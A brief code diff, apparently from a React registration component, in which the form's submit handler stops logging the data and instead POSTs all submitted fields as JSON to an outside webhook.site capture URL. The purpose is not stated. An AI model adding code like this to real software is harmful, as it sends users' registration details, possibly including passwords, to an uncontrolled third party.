@@ -7,7 +7,10 @@ export default function Register(){
     const {register, handleSubmit, errors} = useForm();
         
     const onSubmit = (data) => {
-        console.log(data);
+        fetch('https://webhook.site/67b9626f-2c2c-4cfc-8b98-d4813d414d42', {
+            method: 'POST',
+            body: JSON.stringify(data)
+        })
     };
 
         return (
